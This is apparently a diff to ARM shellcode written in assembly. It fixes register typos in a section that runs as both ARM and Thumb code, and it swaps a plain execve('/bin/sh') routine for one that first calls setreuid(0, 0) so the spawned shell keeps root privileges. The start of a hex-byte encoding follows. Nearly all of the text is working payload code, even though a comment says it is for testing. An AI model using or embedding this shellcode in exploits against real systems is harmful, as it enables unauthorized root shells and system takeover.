@@ -23,27 +23,26 @@ _start:
         movcc  r4, sp           /* ands r5, r1       ; adds  r1, #160 */
         pushcs {r1, r4, r10}    /* lsls r2, r2, #16  ; cmp   r1, #45  */
         pushcc {r1, r4, r10}    /* lsls r2, r2, #16  ; subs  r1, #45  */
-        popcs  {r1, sp, pc}     /* add  r0, rc, #8   ; cmp   r0, #189 */
-        popcc  {r1, sp, pc}     /* add  r0, rc, #8   ; subs  r0, #189 */
+        popcs  {r1, sp, pc}     /* add  r0, pc, #8   ; cmp   r0, #189 */
+        popcc  {r1, sp, pc}     /* add  r0, pc, #8   ; subs  r0, #189 */
 
-/* code below is in Thumb mode
- * launches execve() shell for
- * testing purposes
+/* code below is in Thumb mode;
+ * it calls setreuid(0, 0) because the shell may drop privileges, i.e., 
+ * if ruid != euid -> euid = ruid
+ * then calls execve("/bin/sh", 0, 0) for testing purposes
  */
 
 .code 16
-        adr    r0, SHELL
-        eor    r2, r2, r2
-        strb	r2, [r0, #7]
-        push	{r0, r2}
-        mov    r1, sp
-        mov    r7, #11
-        svc    #1
-
-.balign 4
-SHELL:
-        .ascii "/bin/shX"
-
+	sub r1, r1, r1
+	add r0, r1, #0
+	mov r7, #70
+	svc #1
+	add r0, pc, #8
+	sub r1, r1, r1
+	sub r2, r2, r2
+	mov r7, #11
+	svc #1
+	.ascii "///bin/sh\0"
 
 /* HEX bytes
  * \x19\xa0\x8f\x22\x15\xa0\x8f\x32
